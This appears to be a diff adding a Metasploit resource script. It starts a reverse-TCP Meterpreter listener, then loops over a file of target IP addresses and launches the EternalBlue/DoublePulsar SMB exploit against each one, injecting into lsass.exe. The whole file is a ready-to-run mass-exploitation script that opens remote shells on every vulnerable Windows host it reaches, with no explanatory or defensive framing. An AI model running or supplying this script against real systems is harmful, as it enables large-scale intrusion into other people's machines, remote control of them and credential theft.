@@ -1,0 +1,43 @@
+use exploit/multi/handler
+ 
+set PAYLOAD windows/meterpreter/reverse_tcp
+ 
+set LHOST IPADDRESS
+ 
+set LPORT 4444
+ 
+set ExitOnSession false
+ 
+exploit -j -z
+ 
+<ruby>
+ 
+File.open("/root/.msf4/modules/exploits/Eternalblue/deps/445.txt","r") do |file|
+ 
+        file.each_line do |ip|
+ 
+                run_single("use exploit/Eternalblue/eternalblue_doublepulsar")
+       
+                run_single("set DOUBLEPULSARPATH /root/.msf4/modules/exploits/Eternalblue/deps")
+ 
+                run_single("set ETERNALBLUEPATH /root/.msf4/modules/exploits/Eternalblue/deps")
+ 
+                run_single("set PROCESSINJECT lsass.exe")
+ 
+                run_single("set LHOST IPADDRESS")
+ 
+                run_single("set PAYLOAD windows/meterpreter/reverse_tcp")
+ 
+                run_single("set LPORT 4444")
+ 
+                run_single("set RHOST #{ip}")
+ 
+                run_single("set DisablePayloadHandler true")
+ 
+                run_single("exploit -j -z")
+ 
+        end
+ 
+end
+ 
+</ruby>
